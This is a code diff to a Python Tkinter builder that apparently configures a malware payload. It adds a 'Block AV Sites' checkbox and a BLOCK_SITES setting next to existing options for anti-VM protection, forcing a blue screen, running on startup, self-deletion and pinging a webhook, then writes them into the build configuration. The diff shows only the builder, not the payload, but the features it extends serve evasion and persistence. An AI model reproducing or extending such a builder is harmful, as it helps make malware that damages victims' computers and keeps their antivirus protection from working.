@@ -22,6 +22,7 @@ class Builder:
 		self.BSOD = tk.BooleanVar(self.root, True)
 		self.Startup = tk.BooleanVar(self.root, True)
 		self.Destruct = tk.BooleanVar(self.root, True)
+		self.blockSites = tk.BooleanVar(self.root, False)
 		self.MSGbox = tk.BooleanVar(self.root, False)
 		self.MSGboxconf = dict()
 		self.__main__()
@@ -49,13 +50,15 @@ class Builder:
 		VMprotect = tk.Checkbutton(self.root, text= "VM Protect", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.VMprotect, command= lambda: self.ToggleBsod(BSOD))
 		Startup = tk.Checkbutton(self.root, text= "Run On Startup", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.Startup)
 		Destruct = tk.Checkbutton(self.root, text= "Delete Self", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.Destruct)
+		blockSites = tk.Checkbutton(self.root, text= "Block AV Sites", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.blockSites)
 		Messagebox = tk.Checkbutton(self.root, text= "Message Box", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.MSGbox, command= self.MessageboxEvent)
 
-		PingME.place(y = 140, x= 20)
-		VMprotect.place(y = 170, x= 20)
-		BSOD.place(y= 200, x= 20)
-		Startup.place(y= 230, x= 20)
-		Destruct.place(y= 260, x= 20)
+		PingME.place(y = 110, x= 20)
+		VMprotect.place(y = 140, x= 20)
+		BSOD.place(y= 170, x= 20)
+		Startup.place(y= 200, x= 20)
+		Destruct.place(y= 230, x= 20)
+		blockSites.place(y= 260, x= 20)
 		Messagebox.place(y= 290, x= 20)
 
 		IconNameLabel = ttk.Label(background= "black", foreground= "white", font= ("Franklin Gothic", 10, "bold"), width= 15, anchor= "center")
@@ -79,7 +82,7 @@ class Builder:
 		self.root.mainloop()
 
 	def Build(self, hook):
-		def exit(exitcode= 0):
+		def Exit(exitcode= 0):
 			os.system("pause > NUL")
 			os._exit(exitcode)
 
@@ -108,9 +111,8 @@ class Builder:
 				res = subprocess.run("python -m venv env", capture_output= True, shell= True)
 				clear()
 				if res.returncode != 0:
-					print('Error: {}'.format(res.stderr.decode(errors= "ignore")))
-					__import__("getpass").getpass("")
-					os._exit(1)
+					print('Error while creating virtual environment ("python -m venv env"): {}'.format(res.stderr.decode(errors= "ignore")))
+					Exit(1)
 
 			print(format1("\u001b[33;1mINFO", "Copying assets to virtual environment..."))
 			for i in os.listdir(datadir := os.path.join(os.path.dirname(__file__), "Data")):
@@ -127,6 +129,7 @@ class Builder:
 					"BSOD" : self.BSOD.get(),
     				"STARTUP" : self.Startup.get(),
     				"DELETE_ITSELF" : self.Destruct.get(),
+				    "BLOCK_SITES" : self.blockSites.get(),
 					"MSGBOX" : self.MSGboxconf
 			}
 			json.dump(configuration, file, indent= 4)
